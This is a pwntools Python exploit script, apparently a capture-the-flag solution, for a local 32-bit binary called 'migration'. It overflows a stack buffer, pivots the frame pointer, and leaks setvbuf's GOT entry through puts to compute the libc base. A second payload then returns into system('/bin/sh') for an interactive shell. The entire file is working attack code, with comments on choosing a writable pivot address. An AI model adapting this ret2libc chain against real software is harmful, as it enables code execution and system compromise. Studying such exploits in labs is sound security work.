#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import struct

exe = context.binary = ELF('./migration')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

context.terminal = ["tilix", "-a", "session-add-right", "-e"]
context.log_level = 'debug'
context.delete_corefiles = True

# -- Exploit goes here --

eip_offset = 44
setvbuf_got_addr = 0x08049ffc
puts_call = exe.symbols.main+63
pop_ebp = 0x0804856b

# writable addresses start at 0x80a000
# keep the new ebp address at high offset otherwise
# esp goes back to non writable address
# you shud try this by changing the address to something like 0x804a400
# you'll probably get a segfault in sigaction
new_ebp_addr = 0x804ac00

io = start()

# payload to leak setvbuf resolved addr from got
payload1 = flat(
    b'a'*(eip_offset-4),
    new_ebp_addr,
    puts_call,
    setvbuf_got_addr,
)

# leak setvbuf function address resolved and stored in got for us <3
io.sendlineafter(":\n", payload1)
setvbuf_addr = int.from_bytes(io.recvuntil("\n")[:-1], byteorder='little')
info("setvbuf leaked addr = %x", setvbuf_addr)

libc = ELF('/usr/lib32/libc.so.6')
libc.address = setvbuf_addr - libc.symbols.setvbuf
info("libc base address = %x", libc.address)

payload2 = flat(
    cyclic(eip_offset-4),
    new_ebp_addr,
    libc.symbols.system,
    0xcafebabe,
    next(libc.search(b'/bin/sh')),
)

io.sendline(payload2)

io.interactive()
